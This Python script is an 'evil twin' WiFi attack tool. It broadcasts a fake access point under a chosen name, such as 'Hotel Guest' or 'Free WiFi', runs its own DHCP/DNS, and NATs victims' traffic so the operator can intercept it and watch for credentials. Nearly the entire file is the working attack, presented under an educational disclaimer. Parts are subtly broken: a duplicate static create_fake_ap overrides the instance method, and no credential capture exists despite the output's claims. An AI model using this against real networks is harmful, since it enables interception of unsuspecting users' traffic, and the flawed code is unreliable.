"""
Evil Twin Attack Tool
======================
Educational tool for creating fake access points (evil twin attacks).
Creates rogue WiFi networks to capture credentials or perform MITM attacks.

WARNING: This tool is for EDUCATIONAL PURPOSES ONLY.
Using it on real networks may be illegal.

Requires: hostapd, dnsmasq, iptables, administrator privileges
"""

import subprocess
import os
import sys
import time
import signal
from typing import Dict, Optional
from datetime import datetime


class EvilTwinAP:
    """Create evil twin access points."""

    def __init__(self, ssid: str, channel: int = 6, interface: str = "wlan0"):
        """
        Initialize evil twin AP.

        Args:
            ssid: Fake network name
            channel: WiFi channel
            interface: Network interface
        """
        self.ssid = ssid
        self.channel = channel
        self.interface = interface

        # Configuration files
        self.hostapd_conf = f"/tmp/hostapd_evil_twin_{datetime.now().strftime('%H%M%S')}.conf"
        self.dnsmasq_conf = f"/tmp/dnsmasq_evil_twin_{datetime.now().strftime('%H%M%S')}.conf"

        # Process IDs
        self.hostapd_pid = None
        self.dnsmasq_pid = None

    def check_dependencies(self) -> bool:
        """Check if required tools are installed."""
        required_tools = ['hostapd', 'dnsmasq', 'iptables']
        missing = []

        for tool in required_tools:
            try:
                subprocess.run([tool, '--version'], capture_output=True, check=True)
            except (subprocess.CalledProcessError, FileNotFoundError):
                missing.append(tool)

        if missing:
            print(f"[!] Missing required tools: {', '.join(missing)}")
            return False

        return True

    def create_hostapd_config(self) -> None:
        """Create hostapd configuration file."""
        config = f"""# Evil Twin AP Configuration
interface={self.interface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
"""

        with open(self.hostapd_conf, 'w') as f:
            f.write(config)

    def create_dnsmasq_config(self) -> None:
        """Create dnsmasq configuration file."""
        config = f"""# Evil Twin DHCP/DNS Configuration
interface={self.interface}
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
server=8.8.4.4
log-queries
log-dhcp
"""

        with open(self.dnsmasq_conf, 'w') as f:
            f.write(config)

    def setup_network(self) -> bool:
        """Set up network interface and routing."""
        try:
            # Bring interface down
            subprocess.run(['ifconfig', self.interface, 'down'], check=True)

            # Set interface to AP mode (if supported)
            try:
                subprocess.run(['iwconfig', self.interface, 'mode', 'master'],
                             capture_output=True)
            except subprocess.CalledProcessError:
                pass  # Some drivers don't support this

            # Assign IP to interface
            subprocess.run(['ifconfig', self.interface, '192.168.1.1', 'up'], check=True)

            # Enable IP forwarding
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')

            # Set up NAT
            subprocess.run(['iptables', '-t', 'nat', '-A', 'POSTROUTING',
                          '-o', 'eth0', '-j', 'MASQUERADE'], check=True)
            subprocess.run(['iptables', '-A', 'FORWARD', '-i', self.interface,
                          '-o', 'eth0', '-j', 'ACCEPT'], check=True)

            return True

        except subprocess.CalledProcessError as e:
            print(f"[!] Network setup failed: {e}")
            return False

    def start_services(self) -> bool:
        """Start hostapd and dnsmasq services."""
        try:
            # Start dnsmasq
            dnsmasq_proc = subprocess.Popen(['dnsmasq', '-C', self.dnsmasq_conf],
                                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.dnsmasq_pid = dnsmasq_proc.pid

            # Give dnsmasq time to start
            time.sleep(2)

            # Start hostapd
            hostapd_proc = subprocess.Popen(['hostapd', self.hostapd_conf],
                                          stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            self.hostapd_pid = hostapd_proc.pid

            # Give hostapd time to start
            time.sleep(3)

            return True

        except Exception as e:
            print(f"[!] Failed to start services: {e}")
            return False

    def cleanup(self) -> None:
        """Clean up configuration and processes."""
        # Stop processes
        if self.hostapd_pid:
            try:
                os.kill(self.hostapd_pid, signal.SIGTERM)
            except ProcessLookupError:
                pass

        if self.dnsmasq_pid:
            try:
                os.kill(self.dnsmasq_pid, signal.SIGTERM)
            except ProcessLookupError:
                pass

        # Clean up iptables
        try:
            subprocess.run(['iptables', '-t', 'nat', '-D', 'POSTROUTING',
                          '-o', 'eth0', '-j', 'MASQUERADE'],
                         capture_output=True)
            subprocess.run(['iptables', '-D', 'FORWARD', '-i', self.interface,
                          '-o', 'eth0', '-j', 'ACCEPT'],
                         capture_output=True)
        except subprocess.CalledProcessError:
            pass

        # Remove config files
        for conf_file in [self.hostapd_conf, self.dnsmasq_conf]:
            try:
                os.remove(conf_file)
            except FileNotFoundError:
                pass

    def create_fake_ap(self) -> Dict:
        """
        Create fake access point.

        Returns:
            dict: Operation results
        """
        if not self.check_dependencies():
            return {
                'success': False,
                'error': 'Missing required dependencies',
                'ssid': self.ssid,
                'channel': self.channel,
                'interface': self.interface
            }

        try:
            print(f"[*] Creating evil twin AP...")
            print(f"    SSID: {self.ssid}")
            print(f"    Channel: {self.channel}")
            print(f"    Interface: {self.interface}")
            print("[!] Press Ctrl+C to stop\n")

            # Create configuration files
            self.create_hostapd_config()
            self.create_dnsmasq_config()

            # Set up network
            if not self.setup_network():
                return {
                    'success': False,
                    'error': 'Network setup failed',
                    'ssid': self.ssid,
                    'channel': self.channel,
                    'interface': self.interface
                }

            # Start services
            if not self.start_services():
                self.cleanup()
                return {
                    'success': False,
                    'error': 'Failed to start AP services',
                    'ssid': self.ssid,
                    'channel': self.channel,
                    'interface': self.interface
                }

            print("[+] Evil twin AP is now running!")
            print(f"[+] Fake network '{self.ssid}' is broadcasting")
            print("[+] DHCP server is active")
            print("[+] Monitor connected clients for credentials")

            # Keep running until interrupted
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[!] Stopping evil twin AP...")

            self.cleanup()

            return {
                'success': True,
                'message': 'Evil twin AP stopped successfully',
                'ssid': self.ssid,
                'channel': self.channel,
                'interface': self.interface
            }

        except Exception as e:
            self.cleanup()
            return {
                'success': False,
                'error': str(e),
                'ssid': self.ssid,
                'channel': self.channel,
                'interface': self.interface
            }

    @staticmethod
    def create_fake_ap(ssid: str, channel: int = 6, interface: str = "wlan0") -> Dict:
        """
        Static method to create fake access point.

        Args:
            ssid: Fake network name
            channel: WiFi channel
            interface: Network interface

        Returns:
            dict: Operation results
        """
        try:
            ap = EvilTwinAP(ssid, channel, interface)
            return ap.create_fake_ap()
        except Exception as e:
            return {
                'success': False,
                'error': str(e),
                'ssid': ssid,
                'channel': channel,
                'interface': interface
            }


def main():
    """Main entry point."""
    import argparse

    parser = argparse.ArgumentParser(
        description='Evil Twin Attack Tool - Educational WiFi Security Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python evil_twin.py -s "Free WiFi" -i wlan0
  python evil_twin.py -s "Hotel Guest" -c 11 -i wlan1

⚠️  WARNING ⚠️
This tool is for EDUCATIONAL PURPOSES ONLY.
Using it on real networks may be illegal.
Requires hostapd, dnsmasq, and administrator privileges.

To create evil twin:
1. Put interface in monitor mode (if needed)
2. Run this tool
3. Monitor for client connections and credential captures
        """
    )

    parser.add_argument('-s', '--ssid', required=True,
                       help='Fake network SSID')
    parser.add_argument('-c', '--channel', type=int, default=6,
                       help='WiFi channel (default: 6)')
    parser.add_argument('-i', '--interface', default='wlan0',
                       help='Network interface (default: wlan0)')

    args = parser.parse_args()

    # Create and run evil twin
    ap = EvilTwinAP(args.ssid, args.channel, args.interface)
    result = ap.create_fake_ap()

    if result['success']:
        print(f"[+] Evil twin AP operation completed")
    else:
        print(f"[!] Error: {result['error']}")
        sys.exit(1)


if __name__ == '__main__':
    main()
